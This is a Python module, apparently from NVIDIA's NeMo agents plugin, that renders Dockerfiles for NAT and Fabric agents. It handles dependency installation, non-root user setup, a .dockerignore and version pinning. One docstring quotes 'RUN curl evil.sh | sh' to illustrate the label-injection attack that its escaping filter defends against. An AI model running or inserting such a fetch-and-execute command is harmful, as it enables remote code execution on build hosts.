# SPDX-FileCopyrightText: Copyright (c) 2025-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Jinja2-based Dockerfile rendering primitives for packaged agents.

The built-in templates target NAT and Fabric agents. Shared render parameters
are kept separate from runtime-specific parameters so both packaging paths can
reuse the image, project, sandbox, and metadata contract without inheriting
fields owned by the other runtime.

Two rendering modes are supported:

* **Config-only mode** – the agent is defined by a single ``config.yaml``.
  The Dockerfile installs ``nvidia-nat[most]`` from PyPI.
* **Project mode** – the agent ships as a full Python project with a
  ``pyproject.toml``.  The Dockerfile runs ``uv pip install .`` and trusts
  the user's ``pyproject.toml`` as the single source of truth for
  dependencies, Python version, and project metadata.  ``uv sync`` is not
  used because it honors ``[tool.uv.sources]`` path overrides that
  typically point at sibling workspace packages outside the build context.
  The template intentionally does NOT paper over common pyproject bugs
  (commented-out ``nvidia-nat``, monorepo-relative ``[tool.setuptools_scm]``
  roots, path-based ``[tool.uv.sources]``) — fixing those in the pyproject
  is the user's responsibility and keeps the container build reproducible.
"""

from __future__ import annotations

import os
import re
from dataclasses import dataclass, field, fields
from pathlib import Path
from typing import Any, Mapping

import jinja2
import yaml

# Marker written as the first line of every plugin-generated ``.dockerignore``
# / ``Dockerfile``.  ``render_dockerignore`` and the CLI no-build path only
# overwrite a file whose first line matches the sentinel — a user-tuned file
# next to a project's pyproject is preserved instead of silently destroyed by
# the next ``nemo agents package`` invocation.
DOCKERIGNORE_SENTINEL = "# Managed by `nemo agents package` — safe to delete if you take ownership."
DOCKERFILE_SENTINEL = "# Managed by `nemo agents package` — safe to delete if you take ownership."

UNRESOLVED_CONTRACT_VERSION = "0.0.0"

#: PEP 440 dev segment. The separator is optional and the spelling is case
#: insensitive, so ``1.2.3dev0`` and ``1.2.3.DEV0`` both normalize to ``1.2.3.dev0``.
_DEV_SEGMENT = re.compile(r"[-_.]?dev[-_.]?[0-9]*$", re.IGNORECASE)


def is_plugin_managed(path: Path) -> bool:
    """Return True if *path* exists and its first line matches the sentinel.

    Used by the CLI no-build path to distinguish a Dockerfile / .dockerignore
    that the plugin itself wrote on a previous run (safe to overwrite) from
    one the user wrote by hand (must not be clobbered).
    """
    if not path.exists():
        return False
    try:
        first_line = path.read_text(encoding="utf-8", errors="replace").splitlines()[:1]
    except OSError:
        return False
    if not first_line:
        return False
    return first_line[0] in (DOCKERFILE_SENTINEL, DOCKERIGNORE_SENTINEL)


def resolve_fabric_harness_install(agent_config: Path) -> tuple[str, bool]:
    """Return the Platform extra and Hermes isolation flag for the default harness."""
    try:
        payload = yaml.safe_load(agent_config.read_text(encoding="utf-8"))
    except (OSError, UnicodeDecodeError, yaml.YAMLError):
        return "nemo-agents-plugin", False
    if not isinstance(payload, Mapping):
        return "nemo-agents-plugin", False

    harnesses = payload.get("harnesses")
    default_harness = payload.get("default_harness")
    selected = (
        harnesses.get(default_harness) if isinstance(harnesses, Mapping) and isinstance(default_harness, str) else None
    )
    kind = selected.get("kind") if isinstance(selected, Mapping) else None
    if not isinstance(kind, str):
        return "nemo-agents-plugin", False
    return _FABRIC_HARNESS_INSTALLS.get(kind, "nemo-agents-plugin"), kind in _HERMES_HARNESS_KINDS


# -- Defaults ---------------------------------------------------------------

_DEFAULTS: dict[str, str] = {
    "base_image_url": "nvcr.io/nvidia/base/ubuntu",
    "base_image_tag": "noble-20260217",
    "python_version": "3.13",
    "uv_version": "0.9.14",
    # Default NAT version — used ONLY as a last-resort fallback.  Callers are
    # expected to pass ``--nat-version`` (or set ``NAT_VERSION``) explicitly
    # so that image tags, labels, and the ``nvidia-nat[most]`` constraint
    # are reproducible.  The ``[most]`` extra pins ``nvidia-nat-core`` and
    # every plugin (langchain, mcp, eval, weave, phoenix, ...) to the SAME
    # version, so a single ``==${NAT_VERSION}`` constraint keeps the
    # core/plugin ABI consistent and avoids ``ImportError: cannot import
    # name ...`` at runtime.  When bumping this default, verify the version
    # resolves cleanly with ``uv pip install --prerelease=allow
    # 'nvidia-nat[most]==<ver>'`` against public PyPI.  Note: NAT does not
    # define an ``[all]`` extra — ``[most]`` is the comprehensive one
    # (includes langchain / react-agent / wiki-search).
    "nat_version": "1.8.0",
}

_ENV_MAP: dict[str, str] = {
    "base_image_url": "NEMO_AGENTS_BASE_IMAGE_URL",
    "base_image_tag": "NEMO_AGENTS_BASE_IMAGE_TAG",
    "python_version": "NEMO_AGENTS_PYTHON_VERSION",
    "nat_version": "NAT_VERSION",
    "uv_version": "NEMO_AGENTS_UV_VERSION",
}

#: Local nemo-helix wheel to install instead of resolving the pinned contract
#: version. Set by an operator rather than a caller: it names a path on the build
#: host, and packaging runs there for the CLI and the platform job alike.
WHEEL_ENV = "NEMO_AGENTS_WHEEL"

#: Newest wheel in the checkout's ``dist``, so the value survives every rebuild.
WHEEL_LATEST = "LATEST"

PINNED_HERMES_COMMIT = "29112bef099274229cadff79cdff7bf7b99c4b77"  # Hermes Agent 0.21.0

_FABRIC_HARNESS_INSTALLS = {
    "claude": "nemo-agents-plugin-claude",
    "nvidia.fabric.claude": "nemo-agents-plugin-claude",
    "codex": "nemo-agents-plugin-codex",
    "nvidia.fabric.codex": "nemo-agents-plugin-codex",
    "deepagents": "nemo-agents-plugin-deepagents",
    "nvidia.fabric.langchain.deepagents": "nemo-agents-plugin-deepagents",
}
_HERMES_HARNESS_KINDS = {"hermes", "nvidia.fabric.hermes"}

# -- Jinja2 template --------------------------------------------------------

NAT_DOCKERFILE_TEMPLATE = (
    f"""\
{DOCKERFILE_SENTINEL}
"""
    + """\
ARG BASE_IMAGE_URL={{ base_image_url }}
ARG BASE_IMAGE_TAG={{ base_image_tag }}
ARG PYTHON_VERSION={{ python_version }}
ARG NAT_VERSION={{ nat_version }}
FROM ${BASE_IMAGE_URL}:${BASE_IMAGE_TAG}
ARG PYTHON_VERSION
ARG NAT_VERSION

COPY --from=ghcr.io/astral-sh/uv:{{ uv_version }} /uv /uvx /bin/

ENV PYTHONDONTWRITEBYTECODE=1

# Keep the uv-managed Python in a world-readable location and use copy
# link-mode so the venv is self-contained (no cross-directory symlinks),
# letting the non-root runtime user exec it without needing /root access.
ENV UV_PYTHON_INSTALL_DIR=/opt/uv/python \\
    UV_LINK_MODE=copy

RUN apt-get update && \\
    apt-get install -y --no-install-recommends g++ gcc ca-certificates curl{% if sandbox_apt_packages %} {{ sandbox_apt_packages }}{% endif %} && \\
    update-ca-certificates && \\
    rm -rf /var/lib/apt/lists/*

ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
ENV SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt

WORKDIR /workspace

COPY ./ /workspace
{% if has_pyproject %}
# Project mode.  ``pyproject.toml`` is the single source of truth: it must
# declare ``nvidia-nat[...]`` (for the ``nat`` CLI), a concrete ``version``
# (or a container-resolvable dynamic version), and every runtime dep.
# ``uv sync`` is deliberately not used because it honors
# ``[tool.uv.sources]`` path overrides pointing at sibling workspace
# packages that typically do not exist inside the build context.
RUN --mount=type=cache,id=uv_cache,target=/root/.cache/uv,sharing=locked \\
    uv venv --python ${PYTHON_VERSION} /workspace/.venv && \\
    . /workspace/.venv/bin/activate && \\
    uv pip install . && \\
    chmod -R a+rX /opt/uv /workspace/.venv
{% else %}
RUN --mount=type=cache,id=uv_cache,target=/root/.cache/uv,sharing=locked \\
    uv venv --python ${PYTHON_VERSION} /workspace/.venv && \\
    . /workspace/.venv/bin/activate && \\
    test -n "${NAT_VERSION}" || { echo "NAT_VERSION build-arg is required" >&2; exit 1; } && \\
    uv pip install --prerelease=allow "nvidia-nat[most]==${NAT_VERSION}" && \\
    chmod -R a+rX /opt/uv /workspace/.venv
{% endif %}
LABEL org.opencontainers.image.title="{{ agent_name | dockerfile_escape }}" \\
      org.opencontainers.image.version="{{ agent_version | dockerfile_escape }}" \\
      org.opencontainers.image.authors="{{ agent_author | dockerfile_escape }}" \\
      org.opencontainers.image.created="{{ build_timestamp | dockerfile_escape }}" \\
      org.opencontainers.image.description="{{ description | dockerfile_escape }}" \\
      org.opencontainers.image.revision="{{ revision | dockerfile_escape }}" \\
      org.opencontainers.image.source="{{ source | dockerfile_escape }}" \\
{%- if licenses %}
      org.opencontainers.image.licenses="{{ licenses | dockerfile_escape }}" \\
{%- endif %}
      com.nemo.agent.id="{{ agent_id | dockerfile_escape }}" \\
      com.nemo.agent.framework="{{ agent_framework | dockerfile_escape }}" \\
      com.nemo.agent.nat-version="{{ nat_version | dockerfile_escape }}" \\
      com.nemo.agent.contract-version="{{ contract_version | dockerfile_escape }}"

ENV NAT_CONFIG_FILE={{ config_file_path }}

ENV PATH="/workspace/.venv/bin:$PATH"
{% if sandbox_user_setup %}
# Sandbox-runtime compatibility ({{ sandbox_runtime }}). The supervisor resolves
# this user by name, so the uid is not load-bearing; --system keeps it out of the
# 1000/1001 range the agent user reclaims below. /opt and /workspace/.venv are
# already world r-x (chmod a+rX above), so this user can read the venv and exec
# the interpreter; its home dir gives NAT a writable cache/config location.
RUN {{ sandbox_user_setup }}
{% endif %}
{% if not allow_root %}
# Some modern base images (notably Ubuntu 24.04 "noble" and the NVIDIA base
# images derived from it) ship with a default unprivileged user at
# uid=1000/gid=1000.  Reclaim 1000 for ``agent`` *by id, not by name* so this
# layer is portable across older base images (where 1000 is free; the guarded
# delete is a no-op) and across future base images that might rename the
# default user.
RUN if getent passwd 1000 >/dev/null; then userdel -rf "$(getent passwd 1000 | cut -d: -f1)" 2>/dev/null || true; fi && \\
    if getent group  1000 >/dev/null; then groupdel -f "$(getent group  1000 | cut -d: -f1)" 2>/dev/null || true; fi && \\
    groupadd -g 1000 agent && useradd -u 1000 -g agent -m agent && \\
    chown -R agent:agent /workspace
USER agent
{% endif %}
ENTRYPOINT ["sh", "-c", "exec nat serve --config_file=$NAT_CONFIG_FILE --host 0.0.0.0"]
"""
)

FABRIC_DOCKERFILE_TEMPLATE = (
    f"""\
{DOCKERFILE_SENTINEL}
"""
    + """\
ARG BASE_IMAGE_URL={{ base_image_url }}
ARG BASE_IMAGE_TAG={{ base_image_tag }}
ARG PYTHON_VERSION={{ python_version }}
FROM ${BASE_IMAGE_URL}:${BASE_IMAGE_TAG}
ARG PYTHON_VERSION

COPY --from=ghcr.io/astral-sh/uv:{{ uv_version }} /uv /uvx /bin/

ENV PYTHONDONTWRITEBYTECODE=1

ENV UV_PYTHON_INSTALL_DIR=/opt/uv/python \\
    UV_LINK_MODE=copy

RUN apt-get update && \\
    apt-get install -y --no-install-recommends g++ gcc ca-certificates curl{% if install_hermes %} git{% endif %}{% if sandbox_apt_packages %} {{ sandbox_apt_packages }}{% endif %} && \\
    update-ca-certificates && \\
    rm -rf /var/lib/apt/lists/*

ENV REQUESTS_CA_BUNDLE=/etc/ssl/certs/ca-certificates.crt
ENV SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt

WORKDIR /workspace

# Preserve the complete agent bundle so paths in agent.yaml continue to resolve
# relative to the packaged config directory.
COPY ./ /workspace
{% if has_pyproject %}
# Install the release-matched NeMo Agents runtime and the packaged project in
# one resolution so incompatible project constraints fail during image build.
RUN --mount=type=cache,id=uv_cache,target=/root/.cache/uv,sharing=locked \\
    uv venv --python ${PYTHON_VERSION} /workspace/.venv && \\
    . /workspace/.venv/bin/activate && \\
    uv pip install --no-sources --prerelease=allow {% if wheel_filename %}"/workspace/{{ wheel_filename }}[{{ platform_extra }}]"{% else %}"nemo-helix[{{ platform_extra }}]=={{ contract_version }}"{% endif %} . && \\
    chmod -R a+rX /opt/uv /workspace/.venv
{% else %}
# Install the release-matched NeMo Agents runtime and selected harness.
RUN --mount=type=cache,id=uv_cache,target=/root/.cache/uv,sharing=locked \\
    uv venv --python ${PYTHON_VERSION} /workspace/.venv && \\
    . /workspace/.venv/bin/activate && \\
    uv pip install --no-sources --prerelease=allow {% if wheel_filename %}"/workspace/{{ wheel_filename }}[{{ platform_extra }}]"{% else %}"nemo-helix[{{ platform_extra }}]=={{ contract_version }}"{% endif %} && \\
    chmod -R a+rX /opt/uv /workspace/.venv
{% endif %}
{% if install_hermes %}
# Hermes Agent cannot share the Platform environment. Install the pinned source
# and matching Fabric adapter in Python 3.12, then let Fabric launch that adapter
# through its isolated interpreter.
RUN --mount=type=cache,id=uv_cache,target=/root/.cache/uv,sharing=locked \\
    uv venv --python 3.12 /opt/hermes-venv && \\
    git init --quiet /opt/hermes-agent && \\
    git -C /opt/hermes-agent remote add origin https://github.com/NousResearch/hermes-agent.git && \\
    git -C /opt/hermes-agent fetch --depth 1 origin {{ pinned_hermes_commit }} && \\
    git -C /opt/hermes-agent checkout --quiet --detach FETCH_HEAD && \\
    FABRIC_VERSION="$(/workspace/.venv/bin/python -c 'import importlib.metadata as m; print(m.version("nemo-fabric"))')" && \\
    uv pip install --no-sources --prerelease=allow --python /opt/hermes-venv/bin/python \\
      "nemo-fabric[relay]==${FABRIC_VERSION}" \\
      "nemo-fabric-adapters-hermes==${FABRIC_VERSION}" \\
      --editable /opt/hermes-agent && \\
    uv pip check --python /opt/hermes-venv/bin/python && \\
    chmod -R a+rX /opt/hermes-agent /opt/hermes-venv
ENV ADAPTER_PYTHON=/opt/hermes-venv/bin/python
{% endif %}

LABEL org.opencontainers.image.title="{{ agent_name | dockerfile_escape }}" \\
      org.opencontainers.image.version="{{ agent_version | dockerfile_escape }}" \\
      org.opencontainers.image.authors="{{ agent_author | dockerfile_escape }}" \\
      org.opencontainers.image.created="{{ build_timestamp | dockerfile_escape }}" \\
      org.opencontainers.image.description="{{ description | dockerfile_escape }}" \\
      org.opencontainers.image.revision="{{ revision | dockerfile_escape }}" \\
      org.opencontainers.image.source="{{ source | dockerfile_escape }}" \\
{%- if licenses %}
      org.opencontainers.image.licenses="{{ licenses | dockerfile_escape }}" \\
{%- endif %}
      com.nemo.agent.id="{{ agent_id | dockerfile_escape }}" \\
      com.nemo.agent.framework="{{ agent_framework | dockerfile_escape }}" \\
      com.nemo.agent.contract-version="{{ contract_version | dockerfile_escape }}"

ENV AGENT_CONFIG_PATH={{ config_file_path }}
ENV PORT=8000
ENV PATH="/workspace/.venv/bin:$PATH"

EXPOSE 8000

{% if sandbox_user_setup %}
# Sandbox-runtime compatibility ({{ sandbox_runtime }}). The supervisor resolves
# this user by name, so the uid is not load-bearing; --system keeps it out of the
# 1000/1001 range the agent user reclaims below.
RUN {{ sandbox_user_setup }}
{% endif %}
{% if not allow_root %}
RUN if getent passwd 1000 >/dev/null; then userdel -rf "$(getent passwd 1000 | cut -d: -f1)" 2>/dev/null || true; fi && \\
    if getent group  1000 >/dev/null; then groupdel -f "$(getent group  1000 | cut -d: -f1)" 2>/dev/null || true; fi && \\
    groupadd -g 1000 agent && useradd -u 1000 -g agent -m agent && \\
    chown -R agent:agent /workspace
USER agent
{% endif %}
ENV VIRTUAL_ENV=/workspace/.venv
ENTRYPOINT ["sh", "-c", "exec python -m nemo_agents_plugin.fabric.server --agent-config \\\"$AGENT_CONFIG_PATH\\\" --host 0.0.0.0 --port \\\"$PORT\\\""]
"""
)

DOCKERIGNORE_TEMPLATE = f"""\
{DOCKERIGNORE_SENTINEL}
.env
.env.*
*.pem
*.key
credentials.json
.git/
.gitignore
__pycache__/
*.pyc
.pytest_cache/
.mypy_cache/
.ruff_cache/
*.egg-info/
dist/
build/
.venv/
node_modules/
"""


# -- Data classes for render parameters ------------------------------------


@dataclass
class SharedRenderParams:
    """Resolved Dockerfile parameters shared by all agent runtimes."""

    base_image_url: str = ""
    base_image_tag: str = ""
    python_version: str = ""
    uv_version: str = ""
    has_pyproject: bool = False
    config_file_path: str = "/workspace/config.yaml"
    allow_root: bool = False
    sandbox_runtime: str = ""
    sandbox_apt_packages: str = ""
    sandbox_user_setup: str = ""
    agent_id: str = ""
    agent_name: str = ""
    agent_version: str = ""
    agent_author: str = ""
    agent_framework: str = ""
    build_timestamp: str = ""
    contract_version: str = ""
    description: str = ""
    licenses: str = ""
    revision: str = ""
    source: str = ""
    extra: dict[str, str] = field(default_factory=dict)


@dataclass
class NatRenderParams(SharedRenderParams):
    """Resolved parameters specific to NAT Dockerfile rendering."""

    nat_version: str = ""


@dataclass
class FabricRenderParams(SharedRenderParams):
    """Resolved parameters specific to Fabric Dockerfile rendering."""

    #: Wheel to install instead of the pinned requirement, relative to the build
    #: context. Empty means resolve ``contract_version`` from an index.
    wheel_filename: str = ""
    platform_extra: str = "nemo-agents-plugin"
    install_hermes: bool = False


# -- Public API -------------------------------------------------------------


def resolve_value(name: str, explicit: str | None = None) -> str:
    """Return the first non-empty value from *explicit*, env var, or default.

    Raises ``ValueError`` for required parameters (those without a default)
    when no value can be resolved.
    """
    value, _ = resolve_value_with_source(name, explicit)
    return value


def resolve_value_with_source(name: str, explicit: str | None = None) -> tuple[str, str]:
    """Same as :func:`resolve_value` but also returns where the value came from.

    Returns:
        A tuple ``(value, source)`` where *source* is one of
        ``"explicit"``, ``"env"``, or ``"default"``.
    """
    if explicit:
        return explicit, "explicit"
    env_var = _ENV_MAP.get(name)
    if env_var:
        env_val = os.environ.get(env_var, "")
        if env_val:
            return env_val, "env"
    default = _DEFAULTS.get(name)
    if default:
        return default, "default"
    raise ValueError(
        f"'{name}' is required.  Pass it explicitly, or set the "
        f"{_ENV_MAP.get(name, name.upper())} environment variable."
    )


def _dockerfile_escape(value: object) -> str:
    """Sanitize a value for safe inclusion inside a Dockerfile double-quoted string.

    Defends against label-injection from any external source whose contents
    flow into ``LABEL ... = "{{ ... }}"`` lines — ``git config user.name``,
    ``git remote get-url origin``, ``pyproject [project].description``, and
    user-supplied ``--agent-author`` / ``--agent-version`` strings. Without
    this filter, a value containing ``"`` or a newline can terminate the
    label string early and inject arbitrary Dockerfile instructions
    (``RUN curl evil.sh | sh``) into the rendered output.

    Backslashes are escaped first so we don't double-escape our own escapes.
    Newlines and carriage returns are collapsed to a single space.
    """
    text = value if isinstance(value, str) else str(value)
    text = text.replace("\\", "\\\\").replace('"', '\\"')
    text = text.replace("\r", " ").replace("\n", " ")
    return text


def _jinja_env() -> jinja2.Environment:
    """Build the shared Jinja2 environment used to render Dockerfiles.

    ``autoescape=False`` because the output is a Dockerfile (not HTML); the
    ``dockerfile_escape`` filter is invoked explicitly at every label
    interpolation site. ``StrictUndefined`` so a typo in an external
    template fails at render time instead of producing a Dockerfile with
    silently empty ``ARG`` / ``LABEL`` lines.
    """
    env = jinja2.Environment(
        autoescape=False,
        keep_trailing_newline=True,
        undefined=jinja2.StrictUndefined,
    )
    env.filters["dockerfile_escape"] = _dockerfile_escape
    template_globals: dict[str, Any] = env.globals
    template_globals["pinned_hermes_commit"] = PINNED_HERMES_COMMIT
    return env


def resolve_shared_render_params(
    agent_config: Path,
    pyproject: Path | None = None,
    *,
    base_image_url: str | None = None,
    base_image_tag: str | None = None,
    python_version: str | None = None,
    uv_version: str | None = None,
    allow_root: bool = False,
    sandbox_runtime: str | None = None,
    agent_version: str | None = None,
    agent_author: str | None = None,
    metadata: dict[str, str] | None = None,
) -> SharedRenderParams:
    """Resolve image, project, sandbox, and metadata fields shared by runtimes."""
    from nemo_agents_plugin.container.metadata import extract_agent_metadata

    has_pyproject = pyproject is not None and pyproject.exists()

    if has_pyproject:
        assert pyproject is not None
        try:
            relative_config = agent_config.resolve().relative_to(pyproject.resolve().parent)
        except ValueError as exc:
            raise ValueError(
                f"agent config {agent_config} is outside the pyproject build "
                f"context ({pyproject.resolve().parent}); move it into the "
                "project tree or omit --pyproject to use the config's directory "
                "as the build context."
            ) from exc
        config_file_path = f"/workspace/{relative_config.as_posix()}"
    else:
        config_file_path = f"/workspace/{agent_config.name}"

    sandbox_runtime_name = ""
    sandbox_apt_packages = ""
    sandbox_user_setup = ""
    if sandbox_runtime:
        from nemo_agents_plugin.container.sandbox import (
            render_apt_packages,
            render_user_setup,
            resolve_sandbox_profile,
        )

        profile = resolve_sandbox_profile(sandbox_runtime)
        sandbox_runtime_name = profile.name
        sandbox_apt_packages = render_apt_packages(profile)
        sandbox_user_setup = render_user_setup(profile)

    if metadata is None:
        metadata = extract_agent_metadata(
            agent_config,
            pyproject,
            agent_version=agent_version,
            agent_author=agent_author,
        )

    return SharedRenderParams(
        base_image_url=resolve_value("base_image_url", base_image_url),
        base_image_tag=resolve_value("base_image_tag", base_image_tag),
        python_version=resolve_value("python_version", python_version),
        uv_version=resolve_value("uv_version", uv_version),
        has_pyproject=has_pyproject,
        config_file_path=config_file_path,
        allow_root=allow_root,
        sandbox_runtime=sandbox_runtime_name,
        sandbox_apt_packages=sandbox_apt_packages,
        sandbox_user_setup=sandbox_user_setup,
        contract_version=get_contract_version(),
        agent_id=metadata["agent_id"],
        agent_name=metadata["agent_name"],
        agent_version=metadata["agent_version"],
        agent_author=metadata["agent_author"],
        agent_framework=metadata["agent_framework"],
        build_timestamp=metadata["build_timestamp"],
        description=metadata["description"],
        licenses=metadata["licenses"],
        revision=metadata["revision"],
        source=metadata["source"],
    )


def _render_context(params: SharedRenderParams) -> dict[str, object]:
    """Flatten shared and runtime-specific dataclass fields for Jinja."""
    ctx = {f.name: getattr(params, f.name) for f in fields(params) if f.name != "extra"}
    ctx.update(params.extra)
    return ctx


def render_nat_dockerfile(
    agent_config: Path,
    pyproject: Path | None = None,
    *,
    base_image_url: str | None = None,
    base_image_tag: str | None = None,
    python_version: str | None = None,
    nat_version: str | None = None,
    uv_version: str | None = None,
    allow_root: bool = False,
    sandbox_runtime: str | None = None,
    agent_version: str | None = None,
    agent_author: str | None = None,
    template_path: str | None = None,
    metadata: dict[str, str] | None = None,
) -> str:
    """Render a Dockerfile string for a NAT agent.

    Args:
        agent_config: Path to the agent ``config.yaml``.
        pyproject: Optional path to ``pyproject.toml`` (enables project mode).
        base_image_url: Override base image URL.
        base_image_tag: Override base image tag.
        python_version: Override Python version.
        nat_version: NAT version (required).
        uv_version: Override ``uv`` version.
        allow_root: When True, skip non-root USER creation.
        sandbox_runtime: Name of a registered sandbox runtime (e.g.
            ``"openshell"``). When set, the runtime's image profile is
            discovered via the ``nemo.sandbox_profiles`` entry-point group and
            its required apt packages + users are baked into the image.
        agent_version: Override agent version label.
        agent_author: Override agent author label.
        template_path: Path to an external Jinja2 template file.
        metadata: Pre-computed metadata from
            :func:`~nemo_agents_plugin.container.metadata.extract_agent_metadata`.
            When supplied, avoids a duplicate extraction (which would shell
            out to ``git`` three times and re-parse the yaml/toml).

    Returns:
        The rendered Dockerfile as a string.

    Raises:
        ValueError: If a required parameter cannot be resolved, or the
            agent config lies outside the pyproject build context (which
            would otherwise produce an image that crashes at startup
            looking for the missing config file).
    """
    shared = resolve_shared_render_params(
        agent_config,
        pyproject,
        base_image_url=base_image_url,
        base_image_tag=base_image_tag,
        python_version=python_version,
        uv_version=uv_version,
        allow_root=allow_root,
        sandbox_runtime=sandbox_runtime,
        agent_version=agent_version,
        agent_author=agent_author,
        metadata=metadata,
    )
    params = NatRenderParams(
        **{f.name: getattr(shared, f.name) for f in fields(shared)},
        nat_version=resolve_value("nat_version", nat_version),
    )

    if template_path:
        # Convert filesystem failures into the documented ``ValueError``
        # contract.  ``_validate_package_flags`` already rejects a missing
        # ``--template`` upfront, but the file can race (chmod, deletion,
        # encoding errors) between that check and the read here.  Letting
        # the raw ``OSError`` / ``UnicodeDecodeError`` propagate would
        # surface as an uncaught traceback because the CLI's error
        # handler only catches ``ValueError``.
        try:
            template_source = Path(template_path).read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as exc:
            raise ValueError(f"failed to read --template file {template_path}: {exc}") from exc
    else:
        template_source = NAT_DOCKERFILE_TEMPLATE

    template = _jinja_env().from_string(template_source)
    return template.render(**_render_context(params))


def render_fabric_dockerfile(
    agent_config: Path,
    pyproject: Path | None = None,
    *,
    base_image_url: str | None = None,
    base_image_tag: str | None = None,
    python_version: str | None = None,
    uv_version: str | None = None,
    allow_root: bool = False,
    sandbox_runtime: str | None = None,
    agent_version: str | None = None,
    agent_author: str | None = None,
    template_path: str | None = None,
    metadata: dict[str, str] | None = None,
    wheel_filename: str = "",
    contract_version: str | None = None,
) -> str:
    """Render a Dockerfile string for a Fabric-backed agent.

    *wheel_filename* names a wheel already copied into the build context; when
    set the image installs it instead of resolving ``contract_version``.
    """
    shared = resolve_shared_render_params(
        agent_config,
        pyproject,
        base_image_url=base_image_url,
        base_image_tag=base_image_tag,
        python_version=python_version,
        uv_version=uv_version,
        allow_root=allow_root,
        sandbox_runtime=sandbox_runtime,
        agent_version=agent_version,
        agent_author=agent_author,
        metadata=metadata,
    )
    # With a wheel, the version the image installs comes from the wheel, not the
    # build host, so labels and the agent id describe what is actually inside.
    if contract_version:
        shared.contract_version = contract_version

    # A wheel is installed from the build context, so the version never has to
    # be resolvable from an index.
    require_installable_contract_version(
        shared.contract_version,
        pins_contract_version=template_path is None and not wheel_filename,
    )
    platform_extra, install_hermes = resolve_fabric_harness_install(agent_config)
    params = FabricRenderParams(
        **{f.name: getattr(shared, f.name) for f in fields(shared)},
        wheel_filename=wheel_filename,
        platform_extra=platform_extra,
        install_hermes=install_hermes,
    )

    if template_path:
        try:
            template_source = Path(template_path).read_text(encoding="utf-8")
        except (OSError, UnicodeDecodeError) as exc:
            raise ValueError(f"failed to read --template file {template_path}: {exc}") from exc
    else:
        template_source = FABRIC_DOCKERFILE_TEMPLATE

    template = _jinja_env().from_string(template_source)
    return template.render(**_render_context(params))


def get_contract_version() -> str:
    """Return the published ``nemo-helix`` package version."""
    from importlib.metadata import PackageNotFoundError, version

    try:
        return version("nemo-helix")
    except PackageNotFoundError:
        return UNRESOLVED_CONTRACT_VERSION


def require_installable_contract_version(contract_version: str, *, pins_contract_version: bool = True) -> None:
    """Reject a version no index can serve: a local identifier or a ``.dev`` release.

    ``pins_contract_version`` is False for a caller-supplied ``--template``,
    whose contents may not pin the version at all.
    """
    if contract_version == UNRESOLVED_CONTRACT_VERSION:
        raise ValueError(
            "Unable to resolve the installed nemo-helix contract version; "
            "Fabric packaging requires an installed release version."
        )

    if not pins_contract_version:
        return

    if os.environ.get("NEMO_AGENTS_ALLOW_UNPUBLISHED_CONTRACT_VERSION", "").strip().lower() in {"1", "true", "yes"}:
        return

    public, _, local = contract_version.partition("+")
    reasons = []
    if local:
        reasons.append("carries a local build identifier")
    if _DEV_SEGMENT.search(public):
        reasons.append("is a developmental release")
    if not reasons:
        return

    raise ValueError(
        f"The installed nemo-helix version '{contract_version}' {' and '.join(reasons)}, so no "
        "package index serves it. Fabric packaging pins this exact version inside the image, so the "
        "build would fail while resolving it. Point NEMO_AGENTS_WHEEL at a locally built wheel "
        "(`uv build --package nemo-helix --wheel --out-dir dist`) to package from a source "
        "checkout, install a released nemo-helix, or set "
        "NEMO_AGENTS_ALLOW_UNPUBLISHED_CONTRACT_VERSION=1 if your index serves this version."
    )


def render_dockerignore(output_dir: Path) -> Path | None:
    """Write the plugin's ``.dockerignore`` into *output_dir*.

    The file is only written when *output_dir* contains no ``.dockerignore``
    or contains one whose first line matches :data:`DOCKERIGNORE_SENTINEL`
    (i.e. was itself generated by this plugin on a previous invocation).
    A user-tuned ``.dockerignore`` is left untouched, and ``None`` is
    returned so the builder's ``finally`` cleanup leaves it in place too.

    Returns the path written, or ``None`` when a user-owned file was preserved.
    """
    path = output_dir / ".dockerignore"
    if path.exists():
        try:
            first_line = path.read_text(encoding="utf-8", errors="replace").splitlines()[:1]
        except OSError:
            first_line = []
        if not first_line or first_line[0] != DOCKERIGNORE_SENTINEL:
            return None
    path.write_text(DOCKERIGNORE_TEMPLATE, encoding="utf-8")
    return path
